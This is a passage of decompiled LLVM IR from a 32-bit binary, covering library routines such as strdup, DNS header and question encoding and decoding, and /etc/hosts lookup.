dec_label_pc_804f714:                             ; preds = %dec_label_pc_804f709, %dec_label_pc_804f70d
  %v0_804f714 = phi i32 [ 0, %dec_label_pc_804f709 ], [ %v0_804f714.pre, %dec_label_pc_804f70d ]
  store i32 %v0_804f663, i32* @ebx, align 4
  store i32 %v0_804f662, i32* %esi.global-to-local, align 4
  store i32 %v0_804f661, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f714

; uselistorder directives
  uselistorder i32 %v1_804f6dd, { 1, 0, 2 }
  uselistorder i32 %v2_804f6d2, { 1, 0, 2 }
  uselistorder i8* %v4_804f689, { 0, 2, 1 }
  uselistorder i32 %v3_804f685, { 1, 0 }
  uselistorder i8* %v2_804f67f, { 1, 0 }
  uselistorder i8** %stack_var_-76, { 1, 4, 0, 3, 2 }
  uselistorder i32 -10, { 3, 2, 0, 1 }
  uselistorder i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80513cc.138, i32 0, i32 0), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804f714, { 1, 0 }
  uselistorder label %dec_label_pc_804f709, { 1, 0 }
  uselistorder label %dec_label_pc_804f6eb, { 1, 0 }
  uselistorder label %dec_label_pc_804f6c6, { 1, 0 }
  uselistorder label %dec_label_pc_804f67f, { 1, 0 }
}

define i32 @__GI_strdup() local_unnamed_addr {
entry:
  %tmp = call i8* @__decompiler_undefined_function_4()
  %stack_var_-12 = alloca i32, align 4
  %v0_804f720 = load i32, i32* @edi, align 4
  %v0_804f721 = load i32, i32* @esi, align 4
  %v0_804f722 = load i32, i32* @ebx, align 4
  store i32 %v0_804f722, i32* %stack_var_-12, align 4
  %v4_804f723 = ptrtoint i8* %tmp to i32
  store i32 %v4_804f723, i32* @edi, align 4
  %v3_804f728 = call i32 @strlen(i8* %tmp)
  %v1_804f72d = add i32 %v3_804f728, 1
  store i32 %v1_804f72d, i32* @esi, align 4
  %v2_804f733 = call i32 @malloc(i32 %v1_804f72d)
  %v1_804f73b = icmp eq i32 %v2_804f733, 0
  br i1 %v1_804f73b, label %dec_label_pc_804f74a, label %dec_label_pc_804f73f

dec_label_pc_804f73f:                             ; preds = %entry
  %v0_804f73f = load i32, i32* @esi, align 4
  %v0_804f740 = load i32, i32* @edi, align 4
  %v5_804f742 = inttoptr i32 %v2_804f733 to i8*
  %v6_804f742 = call i32 @memcpy(i8* %v5_804f742, i32 %v0_804f740, i32 %v0_804f73f)
  br label %dec_label_pc_804f74a

dec_label_pc_804f74a:                             ; preds = %entry, %dec_label_pc_804f73f
  %v2_804f74c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f74c, i32* @ebx, align 4
  store i32 %v0_804f721, i32* @esi, align 4
  store i32 %v0_804f720, i32* @edi, align 4
  ret i32 %v2_804f733

; uselistorder directives
  uselistorder i32 %v2_804f733, { 2, 0, 1 }
  uselistorder i8* %tmp, { 1, 0 }
  uselistorder i32 (i32)* @malloc, { 15, 11, 10, 14, 13, 9, 8, 7, 6, 5, 0, 1, 16, 2, 4, 3, 12 }
  uselistorder label %dec_label_pc_804f74a, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i8* @__decompiler_undefined_function_4()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %edi.global-to-local, align 4
  %v4_804f758 = ptrtoint i8* %tmp10 to i32
  store i32 %v4_804f758, i32* %ebp.global-to-local, align 4
  %v7_804f764 = icmp sgt i32 %tmp, 11
  br i1 %v7_804f764, label %dec_label_pc_804f76a, label %dec_label_pc_804f801

dec_label_pc_804f76a:                             ; preds = %entry
  %v1_804f76a = add i32 %tmp11, 1
  %v2_804f76a = inttoptr i32 %v1_804f76a to i8*
  %v3_804f76a = load i8, i8* %v2_804f76a, align 1
  store i8 %v3_804f76a, i8* %tmp10, align 1
  %v0_804f771 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f771 = inttoptr i32 %v0_804f771 to i32*
  %v2_804f771 = load i32, i32* %v1_804f771, align 4
  %v1_804f773 = trunc i32 %v2_804f771 to i8
  %v2_804f773 = load i32, i32* %ebp.global-to-local, align 4
  %v3_804f773 = add i32 %v2_804f773, 1
  %v4_804f773 = inttoptr i32 %v3_804f773 to i8*
  store i8 %v1_804f773, i8* %v4_804f773, align 1
  %v0_804f797 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f797 = add i32 %v0_804f797, 8
  %v2_804f797 = inttoptr i32 %v1_804f797 to i32*
  %v3_804f797 = load i32, i32* %v2_804f797, align 4
  %v1_804f79a = mul i32 %v3_804f797, 8
  %v1_804f7a0 = add i32 %v0_804f797, 20
  %v2_804f7a0 = inttoptr i32 %v1_804f7a0 to i32*
  %v3_804f7a0 = load i32, i32* %v2_804f7a0, align 4
  %v4_804f7a0 = icmp eq i32 %v3_804f7a0, 0
  %v1_804f7a4 = icmp eq i1 %v4_804f7a0, false
  %v2_804f7a4 = zext i1 %v1_804f7a4 to i32
  %v2_804f7a9 = or i32 %v1_804f79a, %v2_804f7a4
  %v2_804f7ad = or i32 %v2_804f7a9, 134
  %v5_804f7ad = trunc i32 %v2_804f7ad to i8
  %v2_804f7af = load i32, i32* %ebp.global-to-local, align 4
  %v3_804f7af = add i32 %v2_804f7af, 2
  %v4_804f7af = inttoptr i32 %v3_804f7af to i8*
  store i8 %v5_804f7ad, i8* %v4_804f7af, align 1
  %v0_804f7b2 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f7bd = add i32 %v0_804f7b2, 28
  %v2_804f7bd = inttoptr i32 %v1_804f7bd to i8*
  %v3_804f7bd = load i8, i8* %v2_804f7bd, align 1
  %tmp17 = urem i8 %v3_804f7bd, 16
  %v2_804f7c3 = or i8 %tmp17, -128
  %v2_804f7c5 = load i32, i32* %ebp.global-to-local, align 4
  %v3_804f7c5 = add i32 %v2_804f7c5, 3
  %v4_804f7c5 = inttoptr i32 %v3_804f7c5 to i8*
  store i8 %v2_804f7c3, i8* %v4_804f7c5, align 1
  %v0_804f7c8 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f7c8 = add i32 %v0_804f7c8, 33
  %v2_804f7c8 = inttoptr i32 %v1_804f7c8 to i8*
  %v3_804f7c8 = load i8, i8* %v2_804f7c8, align 1
  %v2_804f7cc = load i32, i32* %ebp.global-to-local, align 4
  %v3_804f7cc = add i32 %v2_804f7cc, 4
  %v4_804f7cc = inttoptr i32 %v3_804f7cc to i8*
  store i8 %v3_804f7c8, i8* %v4_804f7cc, align 1
  %v0_804f7cf = load i32, i32* %edi.global-to-local, align 4
  %v1_804f7cf = add i32 %v0_804f7cf, 32
  %v2_804f7cf = inttoptr i32 %v1_804f7cf to i32*
  %v3_804f7cf = load i32, i32* %v2_804f7cf, align 4
  %v1_804f7d2 = trunc i32 %v3_804f7cf to i8
  %v2_804f7d2 = load i32, i32* %ebp.global-to-local, align 4
  %v3_804f7d2 = add i32 %v2_804f7d2, 5
  %v4_804f7d2 = inttoptr i32 %v3_804f7d2 to i8*
  store i8 %v1_804f7d2, i8* %v4_804f7d2, align 1
  %v0_804f7d5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f7d5 = add i32 %v0_804f7d5, 37
  %v2_804f7d5 = inttoptr i32 %v1_804f7d5 to i8*
  %v3_804f7d5 = load i8, i8* %v2_804f7d5, align 1
  %v2_804f7d9 = load i32, i32* %ebp.global-to-local, align 4
  %v3_804f7d9 = add i32 %v2_804f7d9, 6
  %v4_804f7d9 = inttoptr i32 %v3_804f7d9 to i8*
  store i8 %v3_804f7d5, i8* %v4_804f7d9, align 1
  %v0_804f7dc = load i32, i32* %edi.global-to-local, align 4
  %v1_804f7dc = add i32 %v0_804f7dc, 36
  %v2_804f7dc = inttoptr i32 %v1_804f7dc to i32*
  %v3_804f7dc = load i32, i32* %v2_804f7dc, align 4
  %v1_804f7df = trunc i32 %v3_804f7dc to i8
  %v2_804f7df = load i32, i32* %ebp.global-to-local, align 4
  %v3_804f7df = add i32 %v2_804f7df, 7
  %v4_804f7df = inttoptr i32 %v3_804f7df to i8*
  store i8 %v1_804f7df, i8* %v4_804f7df, align 1
  %v0_804f7e2 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f7e2 = add i32 %v0_804f7e2, 41
  %v2_804f7e2 = inttoptr i32 %v1_804f7e2 to i8*
  %v3_804f7e2 = load i8, i8* %v2_804f7e2, align 1
  %v2_804f7e6 = load i32, i32* %ebp.global-to-local, align 4
  %v3_804f7e6 = add i32 %v2_804f7e6, 8
  %v4_804f7e6 = inttoptr i32 %v3_804f7e6 to i8*
  store i8 %v3_804f7e2, i8* %v4_804f7e6, align 1
  %v0_804f7e9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f7e9 = add i32 %v0_804f7e9, 40
  %v2_804f7e9 = inttoptr i32 %v1_804f7e9 to i32*
  %v3_804f7e9 = load i32, i32* %v2_804f7e9, align 4
  %v1_804f7ec = trunc i32 %v3_804f7e9 to i8
  %v2_804f7ec = load i32, i32* %ebp.global-to-local, align 4
  %v3_804f7ec = add i32 %v2_804f7ec, 9
  %v4_804f7ec = inttoptr i32 %v3_804f7ec to i8*
  store i8 %v1_804f7ec, i8* %v4_804f7ec, align 1
  %v0_804f7ef = load i32, i32* %edi.global-to-local, align 4
  %v1_804f7ef = add i32 %v0_804f7ef, 45
  %v2_804f7ef = inttoptr i32 %v1_804f7ef to i8*
  %v3_804f7ef = load i8, i8* %v2_804f7ef, align 1
  %v2_804f7f3 = load i32, i32* %ebp.global-to-local, align 4
  %v3_804f7f3 = add i32 %v2_804f7f3, 10
  %v4_804f7f3 = inttoptr i32 %v3_804f7f3 to i8*
  store i8 %v3_804f7ef, i8* %v4_804f7f3, align 1
  %v0_804f7f6 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f7f6 = add i32 %v0_804f7f6, 44
  %v2_804f7f6 = inttoptr i32 %v1_804f7f6 to i32*
  %v3_804f7f6 = load i32, i32* %v2_804f7f6, align 4
  %v1_804f7f9 = trunc i32 %v3_804f7f6 to i8
  %v2_804f7f9 = load i32, i32* %ebp.global-to-local, align 4
  %v3_804f7f9 = add i32 %v2_804f7f9, 11
  %v4_804f7f9 = inttoptr i32 %v3_804f7f9 to i8*
  store i8 %v1_804f7f9, i8* %v4_804f7f9, align 1
  br label %dec_label_pc_804f801

dec_label_pc_804f801:                             ; preds = %entry, %dec_label_pc_804f76a
  %v0_804f805 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_804f76a ]
  ret i32 %v0_804f805

; uselistorder directives
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 2, 1, 0 }
  uselistorder i32 33, { 1, 0 }
  uselistorder label %dec_label_pc_804f801, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_4()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f808 = load i32, i32* @ebx, align 4
  store i32 %v0_804f808, i32* %stack_var_-4, align 4
  %v4_804f809 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_804f809, i32* %ecx.global-to-local, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v1_804f811 = add i32 %v4_804f809, 1
  %v2_804f811 = inttoptr i32 %v1_804f811 to i8*
  %v3_804f811 = load i8, i8* %v2_804f811, align 1
  %v4_804f811 = zext i8 %v3_804f811 to i32
  %v2_804f815 = load i8, i8* %tmp2, align 1
  %v3_804f815 = zext i8 %v2_804f815 to i32
  %v2_804f818 = mul nuw nsw i32 %v3_804f815, 256
  %v2_804f81b = or i32 %v2_804f818, %v4_804f811
  %v2_804f81d = inttoptr i32 %tmp to i32*
  store i32 %v2_804f81b, i32* %v2_804f81d, align 4
  %v0_804f81f = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f81f = add i32 %v0_804f81f, 2
  %v2_804f81f = inttoptr i32 %v1_804f81f to i8*
  %v3_804f81f = load i8, i8* %v2_804f81f, align 1
  %tmp6 = icmp slt i8 %v3_804f81f, 0
  %v2_804f823 = zext i1 %tmp6 to i32
  %v1_804f826 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f826 = add i32 %v1_804f826, 4
  %v3_804f826 = inttoptr i32 %v2_804f826 to i32*
  store i32 %v2_804f823, i32* %v3_804f826, align 4
  %v0_804f829 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f829 = add i32 %v0_804f829, 2
  %v2_804f829 = inttoptr i32 %v1_804f829 to i8*
  %v3_804f829 = load i8, i8* %v2_804f829, align 1
  %v3_804f82c = udiv i8 %v3_804f829, 8
  %tmp7 = urem i8 %v3_804f82c, 16
  %v1_804f82f = zext i8 %tmp7 to i32
  %v1_804f832 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f832 = add i32 %v1_804f832, 8
  %v3_804f832 = inttoptr i32 %v2_804f832 to i32*
  store i32 %v1_804f82f, i32* %v3_804f832, align 4
  %v0_804f835 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f835 = add i32 %v0_804f835, 2
  %v2_804f835 = inttoptr i32 %v1_804f835 to i8*
  %v3_804f835 = load i8, i8* %v2_804f835, align 1
  %div = udiv i8 %v3_804f835, 4
  %tmp8 = urem i8 %div, 2
  %v1_804f83c = zext i8 %tmp8 to i32
  %v1_804f83f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f83f = add i32 %v1_804f83f, 12
  %v3_804f83f = inttoptr i32 %v2_804f83f to i32*
  store i32 %v1_804f83c, i32* %v3_804f83f, align 4
  %v0_804f842 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f842 = add i32 %v0_804f842, 2
  %v2_804f842 = inttoptr i32 %v1_804f842 to i8*
  %v3_804f842 = load i8, i8* %v2_804f842, align 1
  %div5 = udiv i8 %v3_804f842, 2
  %tmp9 = urem i8 %div5, 2
  %v1_804f848 = zext i8 %tmp9 to i32
  %v1_804f84b = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f84b = add i32 %v1_804f84b, 16
  %v3_804f84b = inttoptr i32 %v2_804f84b to i32*
  store i32 %v1_804f848, i32* %v3_804f84b, align 4
  %v0_804f84e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f84e = add i32 %v0_804f84e, 2
  %v2_804f84e = inttoptr i32 %v1_804f84e to i8*
  %v3_804f84e = load i8, i8* %v2_804f84e, align 1
  %tmp10 = urem i8 %v3_804f84e, 2
  %v1_804f852 = zext i8 %tmp10 to i32
  %v1_804f855 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f855 = add i32 %v1_804f855, 20
  %v3_804f855 = inttoptr i32 %v2_804f855 to i32*
  store i32 %v1_804f852, i32* %v3_804f855, align 4
  %v0_804f858 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f858 = add i32 %v0_804f858, 3
  %v2_804f858 = inttoptr i32 %v1_804f858 to i8*
  %v3_804f858 = load i8, i8* %v2_804f858, align 1
  %tmp11 = icmp slt i8 %v3_804f858, 0
  %v2_804f85c = zext i1 %tmp11 to i32
  %v1_804f85f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f85f = add i32 %v1_804f85f, 24
  %v3_804f85f = inttoptr i32 %v2_804f85f to i32*
  store i32 %v2_804f85c, i32* %v3_804f85f, align 4
  %v0_804f862 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f862 = add i32 %v0_804f862, 3
  %v2_804f862 = inttoptr i32 %v1_804f862 to i8*
  %v3_804f862 = load i8, i8* %v2_804f862, align 1
  %tmp12 = urem i8 %v3_804f862, 16
  %v1_804f866 = zext i8 %tmp12 to i32
  %v1_804f869 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f869 = add i32 %v1_804f869, 28
  %v3_804f869 = inttoptr i32 %v2_804f869 to i32*
  store i32 %v1_804f866, i32* %v3_804f869, align 4
  %v0_804f86c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f86c = add i32 %v0_804f86c, 4
  %v2_804f86c = inttoptr i32 %v1_804f86c to i8*
  %v3_804f86c = load i8, i8* %v2_804f86c, align 1
  %v4_804f86c = zext i8 %v3_804f86c to i32
  %v2_804f870 = mul nuw nsw i32 %v4_804f86c, 256
  %v1_804f873 = add i32 %v0_804f86c, 5
  %v2_804f873 = inttoptr i32 %v1_804f873 to i8*
  %v3_804f873 = load i8, i8* %v2_804f873, align 1
  %v4_804f873 = zext i8 %v3_804f873 to i32
  %v2_804f877 = or i32 %v4_804f873, %v2_804f870
  %v1_804f879 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f879 = add i32 %v1_804f879, 32
  %v3_804f879 = inttoptr i32 %v2_804f879 to i32*
  store i32 %v2_804f877, i32* %v3_804f879, align 4
  %v0_804f87c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f87c = add i32 %v0_804f87c, 6
  %v2_804f87c = inttoptr i32 %v1_804f87c to i8*
  %v3_804f87c = load i8, i8* %v2_804f87c, align 1
  %v4_804f87c = zext i8 %v3_804f87c to i32
  %v2_804f880 = mul nuw nsw i32 %v4_804f87c, 256
  %v1_804f883 = add i32 %v0_804f87c, 7
  %v2_804f883 = inttoptr i32 %v1_804f883 to i8*
  %v3_804f883 = load i8, i8* %v2_804f883, align 1
  %v4_804f883 = zext i8 %v3_804f883 to i32
  %v2_804f887 = or i32 %v4_804f883, %v2_804f880
  %v1_804f889 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f889 = add i32 %v1_804f889, 36
  %v3_804f889 = inttoptr i32 %v2_804f889 to i32*
  store i32 %v2_804f887, i32* %v3_804f889, align 4
  %v0_804f88c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f88c = add i32 %v0_804f88c, 8
  %v2_804f88c = inttoptr i32 %v1_804f88c to i8*
  %v3_804f88c = load i8, i8* %v2_804f88c, align 1
  %v4_804f88c = zext i8 %v3_804f88c to i32
  %v2_804f890 = mul nuw nsw i32 %v4_804f88c, 256
  %v1_804f893 = add i32 %v0_804f88c, 9
  %v2_804f893 = inttoptr i32 %v1_804f893 to i8*
  %v3_804f893 = load i8, i8* %v2_804f893, align 1
  %v4_804f893 = zext i8 %v3_804f893 to i32
  %v2_804f897 = or i32 %v4_804f893, %v2_804f890
  %v1_804f899 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f899 = add i32 %v1_804f899, 40
  %v3_804f899 = inttoptr i32 %v2_804f899 to i32*
  store i32 %v2_804f897, i32* %v3_804f899, align 4
  %v0_804f89c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f89c = add i32 %v0_804f89c, 10
  %v2_804f89c = inttoptr i32 %v1_804f89c to i8*
  %v3_804f89c = load i8, i8* %v2_804f89c, align 1
  %v4_804f89c = zext i8 %v3_804f89c to i32
  %v2_804f8a0 = mul nuw nsw i32 %v4_804f89c, 256
  %v1_804f8a3 = add i32 %v0_804f89c, 11
  %v2_804f8a3 = inttoptr i32 %v1_804f8a3 to i8*
  %v3_804f8a3 = load i8, i8* %v2_804f8a3, align 1
  %v4_804f8a3 = zext i8 %v3_804f8a3 to i32
  %v2_804f8a7 = or i32 %v4_804f8a3, %v2_804f8a0
  %v1_804f8a9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f8a9 = add i32 %v1_804f8a9, 44
  %v3_804f8a9 = inttoptr i32 %v2_804f8a9 to i32*
  store i32 %v2_804f8a7, i32* %v3_804f8a9, align 4
  %v2_804f8ac = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f8ac, i32* @ebx, align 4
  ret i32 %v2_804f8a7

; uselistorder directives
  uselistorder i32* %ecx.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11 }
  uselistorder i32 11, { 9, 10, 2, 1, 4, 5, 6, 7, 8, 0, 11, 3, 12 }
  uselistorder i32 36, { 10, 11, 6, 7, 14, 15, 16, 17, 18, 19, 8, 12, 13, 9, 0, 2, 1, 3, 20, 4, 5 }
  uselistorder i32 7, { 16, 17, 2, 9, 10, 11, 12, 13, 14, 15, 3, 6, 4, 0, 1, 7, 8, 5 }
  uselistorder i8 4, { 0, 4, 1, 5, 2, 3, 6 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_804f8b0 = load i32, i32* @edi, align 4
  %v0_804f8b1 = load i32, i32* @esi, align 4
  %v0_804f8b2 = load i32, i32* @ebx, align 4
  store i32 %v0_804f8b2, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v1_804f8c1 = inttoptr i32 %tmp3 to i32*
  %v2_804f8c1 = load i32, i32* %v1_804f8c1, align 4
  %v6_804f8c3 = inttoptr i32 %v2_804f8c1 to i8*
  %v7_804f8c3 = call i32 @__encode_dotted(i8* %v6_804f8c3, i32 %tmp2, i32 %tmp, i32 %v0_804f8b2, i32 %v0_804f8b1, i32 %v0_804f8b0)
  store i32 %v7_804f8c3, i32* %ecx.global-to-local, align 4
  %v2_804f8cd = icmp slt i32 %v7_804f8c3, 0
  br i1 %v2_804f8cd, label %dec_label_pc_804f8fc, label %dec_label_pc_804f8d1

dec_label_pc_804f8d1:                             ; preds = %entry
  %v0_804f8d1 = load i32, i32* @ebx, align 4
  %v2_804f8d1 = sub i32 %v0_804f8d1, %v7_804f8c3
  %v1_804f8d3 = add i32 %v2_804f8d1, -3
  %v6_804f8d3 = sub i32 2, %v2_804f8d1
  %v7_804f8d3 = and i32 %v6_804f8d3, %v2_804f8d1
  %v8_804f8d3 = icmp slt i32 %v7_804f8d3, 0
  %v9_804f8d3 = icmp eq i32 %v1_804f8d3, 0
  %v10_804f8d3 = icmp slt i32 %v1_804f8d3, 0
  %v3_804f8d6 = icmp eq i1 %v10_804f8d3, %v8_804f8d3
  %v4_804f8d6 = icmp eq i1 %v9_804f8d3, false
  %v5_804f8d6 = and i1 %v4_804f8d6, %v3_804f8d6
  br i1 %v5_804f8d6, label %dec_label_pc_804f8dd, label %dec_label_pc_804f8d8

dec_label_pc_804f8d8:                             ; preds = %dec_label_pc_804f8d1
  store i32 -1, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f8fc

dec_label_pc_804f8dd:                             ; preds = %dec_label_pc_804f8d1
  %v0_804f8dd = load i32, i32* @edi, align 4
  %v2_804f8dd = add i32 %v0_804f8dd, %v7_804f8c3
  store i32 %v2_804f8dd, i32* %edx.global-to-local, align 4
  %v0_804f8e0 = load i32, i32* @esi, align 4
  %v1_804f8e0 = add i32 %v0_804f8e0, 5
  %v2_804f8e0 = inttoptr i32 %v1_804f8e0 to i8*
  %v3_804f8e0 = load i8, i8* %v2_804f8e0, align 1
  %v3_804f8e4 = inttoptr i32 %v2_804f8dd to i8*
  store i8 %v3_804f8e0, i8* %v3_804f8e4, align 1
  %v0_804f8e6 = load i32, i32* @esi, align 4
  %v1_804f8e6 = add i32 %v0_804f8e6, 4
  %v2_804f8e6 = inttoptr i32 %v1_804f8e6 to i32*
  %v3_804f8e6 = load i32, i32* %v2_804f8e6, align 4
  %v1_804f8e9 = trunc i32 %v3_804f8e6 to i8
  %v2_804f8e9 = load i32, i32* %edx.global-to-local, align 4
  %v3_804f8e9 = add i32 %v2_804f8e9, 1
  %v4_804f8e9 = inttoptr i32 %v3_804f8e9 to i8*
  store i8 %v1_804f8e9, i8* %v4_804f8e9, align 1
  %v0_804f8ec = load i32, i32* @esi, align 4
  %v1_804f8ec = add i32 %v0_804f8ec, 9
  %v2_804f8ec = inttoptr i32 %v1_804f8ec to i8*
  %v3_804f8ec = load i8, i8* %v2_804f8ec, align 1
  %v2_804f8f0 = load i32, i32* %edx.global-to-local, align 4
  %v3_804f8f0 = add i32 %v2_804f8f0, 2
  %v4_804f8f0 = inttoptr i32 %v3_804f8f0 to i8*
  store i8 %v3_804f8ec, i8* %v4_804f8f0, align 1
  %v0_804f8f3 = load i32, i32* @esi, align 4
  %v1_804f8f3 = add i32 %v0_804f8f3, 8
  %v2_804f8f3 = inttoptr i32 %v1_804f8f3 to i32*
  %v3_804f8f3 = load i32, i32* %v2_804f8f3, align 4
  %v1_804f8f6 = trunc i32 %v3_804f8f3 to i8
  %v2_804f8f6 = load i32, i32* %edx.global-to-local, align 4
  %v3_804f8f6 = add i32 %v2_804f8f6, 3
  %v4_804f8f6 = inttoptr i32 %v3_804f8f6 to i8*
  store i8 %v1_804f8f6, i8* %v4_804f8f6, align 1
  %v0_804f8f9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f8f9 = add i32 %v0_804f8f9, 4
  store i32 %v1_804f8f9, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f8fc

dec_label_pc_804f8fc:                             ; preds = %entry, %dec_label_pc_804f8d8, %dec_label_pc_804f8dd
  %v0_804f8fc = phi i32 [ %v7_804f8c3, %entry ], [ -1, %dec_label_pc_804f8d8 ], [ %v1_804f8f9, %dec_label_pc_804f8dd ]
  %v2_804f8fe = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f8fe, i32* @ebx, align 4
  store i32 %v0_804f8b0, i32* @edi, align 4
  ret i32 %v0_804f8fc

; uselistorder directives
  uselistorder i32 %v1_804f8d3, { 1, 0 }
  uselistorder i32 %v2_804f8d1, { 0, 2, 1 }
  uselistorder i32 %v7_804f8c3, { 1, 0, 2, 3, 4 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 5, { 15, 16, 17, 6, 4, 13, 7, 5, 0, 1, 2, 8, 3, 12, 9, 10, 14, 11, 18, 19 }
  uselistorder label %dec_label_pc_804f8fc, { 2, 1, 0 }
}

define i32 @__open_etc_hosts(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v2_804f909 = call i32 @__GI_config_open(i32 ptrtoint ([11 x i8]* @global_var_8051f26.140 to i32))
  ret i32 %v2_804f909

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 2, 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp44 = ptrtoint i32* %arg5 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804f910 = load i32, i32* @ebp, align 4
  %v0_804f911 = load i32, i32* @edi, align 4
  %v0_804f912 = load i32, i32* @esi, align 4
  %v0_804f913 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %tmp44, i32* @ebp, align 4
  store i32 %arg7, i32* @ebx, align 4
  store i32 %arg9, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804f92f = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_804f92f, align 4
  %v0_804f93d = load i32, i32* @ebx, align 4
  %tmp67 = icmp ult i32 %v0_804f93d, 129
  br i1 %tmp67, label %dec_label_pc_804fac2, label %dec_label_pc_804f949

dec_label_pc_804f949:                             ; preds = %entry
  %v0_804f949 = load i32, i32* @edi, align 4
  %v1_804f949 = icmp eq i32 %v0_804f949, 0
  %v1_804f94b = icmp eq i1 %v1_804f949, false
  br i1 %v1_804f94b, label %dec_label_pc_804f972, label %dec_label_pc_804f94d

dec_label_pc_804f94d:                             ; preds = %dec_label_pc_804f949
  %v1_804f94d = load i32, i32* %stack_var_-20, align 4
  %v5_804f94d = call i32 @__open_etc_hosts(i32 34, i32 %v1_804f94d, i32 %v0_804f913, i32 %v0_804f912, i32 %v0_804f911)
  store i32 %v5_804f94d, i32* %eax.global-to-local, align 4
  store i32 %v5_804f94d, i32* @edi, align 4
  %v1_804f954 = icmp eq i32 %v5_804f94d, 0
  %v1_804f956 = icmp eq i1 %v1_804f954, false
  br i1 %v1_804f956, label %dec_label_pc_804f972, label %dec_label_pc_804f958

dec_label_pc_804f958:                             ; preds = %dec_label_pc_804f94d
  store i32 %arg8, i32* %eax.global-to-local, align 4
  %v1_804f95c = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_804f95c, align 4
  %v1_804f962 = call i32 @__GI___errno_location(i32 34)
  store i32 %v1_804f962, i32* %eax.global-to-local, align 4
  %v1_804f967 = inttoptr i32 %v1_804f962 to i32*
  %v2_804f967 = load i32, i32* %v1_804f967, align 4
  store i32 %v2_804f967, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fac2

dec_label_pc_804f972:                             ; preds = %dec_label_pc_804f94d, %dec_label_pc_804f949
  %v1_804f976 = phi i32 [ %v5_804f94d, %dec_label_pc_804f94d ], [ %v0_804f949, %dec_label_pc_804f949 ]
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v2_804f976 = add i32 %v1_804f976, 4
  %v3_804f976 = inttoptr i32 %v2_804f976 to i32*
  store i32 %arg6, i32* %v3_804f976, align 4
  %v0_804f979 = load i32, i32* @edi, align 4
  %v1_804f979 = add i32 %v0_804f979, 8
